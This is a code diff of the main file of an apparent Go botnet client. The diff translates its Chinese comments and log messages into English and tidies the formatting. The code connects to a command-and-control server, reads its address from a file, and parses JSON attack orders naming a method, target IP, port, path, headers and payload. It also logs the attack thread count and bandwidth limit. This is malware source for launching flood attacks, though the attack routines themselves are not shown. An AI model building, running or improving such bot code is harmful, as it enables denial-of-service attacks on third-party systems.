@@ -2,13 +2,13 @@ package main
 
 import (
 	"bufio"
+	"bytes"
 	"encoding/json"
 	"io"
 	"log"
 	"net"
 	"os"
 	"strings"
-	"bytes"
 
 	"bot/attacker"
 	"bot/attacker/attack"
@@ -19,7 +19,7 @@ func handleC2Connection(conn net.Conn) {
 
 	reader := bufio.NewReader(conn)
 	for {
-		// 读取JSON字节流
+		// Read JSON byte stream
 		commandBytes, err := reader.ReadBytes('\n')
 		if err != nil {
 			if err == io.EOF {
@@ -39,7 +39,7 @@ func handleC2Connection(conn net.Conn) {
 	}
 }
 
-// 帮助截断长字符串用于日志显示
+// Helper function to truncate long strings for logging
 func truncateString(s string, maxLength int) string {
 	if len(s) <= maxLength {
 		return s
@@ -47,62 +47,60 @@ func truncateString(s string, maxLength int) string {
 	return s[:maxLength] + "..."
 }
 
-func parseCommand(cmd []byte) (method string, ip string, port int, path string, header string, payload string, ok bool) {	
+func parseCommand(cmd []byte) (method string, ip string, port int, path string, header string, payload string, ok bool) {
 	var command BotCommand
 	if err := json.Unmarshal(cmd, &command); err != nil {
 		log.Printf("Error parsing command: %v", err)
 		return "", "", 0, "", "", "", false
-	}	
+	}
 
-	// 处理停止命令
-    if command.Method == "STOP" {
-        return "STOP", "", 0, "", "", "", true
-    }
-    
-    // 验证IP
-    if net.ParseIP(command.IP) == nil {
-        log.Printf("无效的IP地址: %s", ip)
-        return "", "", 0, "", "", "", false
-    }
-    
-    // 验证端口
-    if command.Port < 1 || command.Port > 65535 {
-        log.Printf("无效的端口号: %v", command.Port)
-        return "", "", 0, "", "", "", false
-    }
-    
-	// 添加路径前缀
+	// Handle stop command
+	if command.Method == "STOP" {
+		return "STOP", "", 0, "", "", "", true
+	}
+
+	// Validate IP
+	if net.ParseIP(command.IP) == nil {
+		log.Printf("Invalid IP address: %s", ip)
+		return "", "", 0, "", "", "", false
+	}
+
+	// Validate port
+	if command.Port < 1 || command.Port > 65535 {
+		log.Printf("Invalid port number: %v", command.Port)
+		return "", "", 0, "", "", "", false
+	}
+
+	// Add path prefix
 	if !strings.HasPrefix(command.Path, "/") {
 		path = "/" + path
 	}
-    
-    
+
 	return command.Method, command.IP, command.Port, command.Path, command.Header, command.Payload, true
 }
 
-
-// initConfig 初始化攻击配置
+// initConfig initializes attack configuration
 func initConfig() {
-	log.Printf("攻击线程数: %d", attack.ThreadCount)
-	log.Printf("带宽限制: %d Kbps", attack.BandwidthLimit)
-	
-	// 确保serverfile目录存在
+	log.Printf("Attack thread count: %d", attack.ThreadCount)
+	log.Printf("Bandwidth limit: %d Kbps", attack.BandwidthLimit)
+
+	// Ensure serverfile directory exists
 	ensureDirectoryExists("./serverfile")
 }
 
-// ensureDirectoryExists 确保目录存在
+// ensureDirectoryExists ensures the directory exists
 func ensureDirectoryExists(dir string) {
 	if _, err := os.Stat(dir); os.IsNotExist(err) {
-		log.Printf("创建目录: %s", dir)
+		log.Printf("Creating directory: %s", dir)
 		if err := os.MkdirAll(dir, 0755); err != nil {
-			log.Fatalf("无法创建目录 %s: %v", dir, err)
+			log.Fatalf("Failed to create directory %s: %v", dir, err)
 		}
 	}
 }
 
-// readC2Address 从文件读取C2服务器地址
+// readC2Address reads the C2 server address from a file
 func readC2Address() string {
-	// 尝试从文件读取地址
+	// Attempt to read the address from a file
 	if _, err := os.Stat(c2File); err == nil {
 		data, err := os.ReadFile(c2File)
 		if err == nil {
@@ -112,18 +110,18 @@ func readC2Address() string {
 			}
 		}
 	}
-	
-	// 文件不存在或读取失败时，写入默认地址
-	const defaultAddr = "127.0.0.1" // 默认本地地址
-	log.Printf("未找到有效的C2地址，使用默认地址: %s", defaultAddr)
-	
-	// 确保serverfile目录存在
+
+	// If file does not exist or reading fails, write the default address
+	const defaultAddr = "127.0.0.1" // Default local address
+	log.Printf("No valid C2 address found, using default address: %s", defaultAddr)
+
+	// Ensure serverfile directory exists
 	ensureDirectoryExists("./serverfile")
-	
-	// 写入默认地址到文件
+
+	// Write the default address to the file
 	if err := os.WriteFile(c2File, []byte(defaultAddr), 0644); err != nil {
-		log.Printf("写入默认C2地址到文件失败: %v", err)
+		log.Printf("Failed to write default C2 address to file: %v", err)
 	}
-	
+
 	return defaultAddr
 }
